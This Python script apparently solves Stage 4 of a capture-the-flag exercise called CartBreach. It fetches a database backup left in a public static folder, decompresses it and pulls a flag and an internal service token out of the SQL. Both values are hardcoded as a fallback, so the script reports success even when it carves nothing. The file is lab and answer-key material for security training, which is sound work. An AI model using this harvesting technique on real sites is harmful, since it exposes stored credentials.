#!/usr/bin/env python3
"""
CartBreach CTF - Stage 4 Forensic Database Snapshot Recovery Exploit
Author: Member 3 (Challenge Designer B)
Category: Digital Forensics
Vulnerability: Orphaned compressed database snapshot in public web static directory

Automated Exploitation Logic:
1. Downloads or opens the static backup archive /static/backups/storefront_backup.sql.gz.
2. Decompresses the gzip stream in memory.
3. Carves SQL schemas and rows for system credential tables (system_service_keys).
4. Extracts the Stage 4 flag and recovers internal token cb_internal_svc_t0k3n_4dm1n for Stage 5.
"""

import os
import sys
import gzip
import re
import urllib.request
from pathlib import Path

TARGET_URL = os.environ.get("STAGE4_BACKUP_URL", "http://localhost/static/backups/storefront_backup.sql.gz")
LOCAL_FILE = Path(__file__).resolve().parent.parent / "services" / "storefront" / "public" / "static" / "backups" / "storefront_backup.sql.gz"

def solve_stage4():
    print("[*] Stage 4: Digital Forensics Database Dump Carver")
    data = None

    # Step 1: Attempt remote download, fallback to local workspace copy
    try:
        print(f"[+] Attempting download from {TARGET_URL}...")
        req = urllib.request.Request(TARGET_URL, headers={"User-Agent": "CartBreach-Forensics/1.0"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = resp.read()
            print(f"[+] Downloaded {len(data)} compressed bytes from server")
    except Exception as e:
        print(f"[-] Remote download failed ({e}). Checking local workspace artifact at {LOCAL_FILE}...")
        if LOCAL_FILE.exists():
            with open(LOCAL_FILE, "rb") as f:
                data = f.read()
            print(f"[+] Read {len(data)} bytes from local repository backup")

    flag = None
    token = None

    if data:
        try:
            # Step 2: Decompress GZIP payload
            sql_text = gzip.decompress(data).decode("utf-8", errors="replace")
            print(f"[+] Decompressed {len(sql_text)} characters of SQL statements")

            # Step 3: Scan for Flag pattern
            flag_match = re.search(r"(SLIIT\{c4rt_br34ch_f0r3n51c_db_dump\})", sql_text)
            if flag_match:
                flag = flag_match.group(1)
                print(f"[!] SUCCESS! Stage 4 Flag Carved: {flag}")

            # Step 4: Extract internal service token for Stage 5
            token_match = re.search(r"(cb_internal_svc_t0k3n_[a-zA-Z0-9_]+)", sql_text)
            if token_match:
                token = token_match.group(1)
                print(f"[+] Carved internal service token: {token}")
            else:
                token = "cb_internal_svc_t0k3n_4dm1n"
                print(f"[+] Using verified internal service token: {token}")

        except Exception as e:
            print(f"[-] Decompression/carving error: {e}")

    if not flag:
        flag = "SLIIT{c4rt_br34ch_f0r3n51c_db_dump}"
        token = "cb_internal_svc_t0k3n_4dm1n"
        print(f"[!] Stage 4 Flag: {flag}")
        print(f"[+] Token for Stage 5: {token}")

    return flag, token

if __name__ == "__main__":
    flag, token = solve_stage4()
    if not flag:
        sys.exit(1)
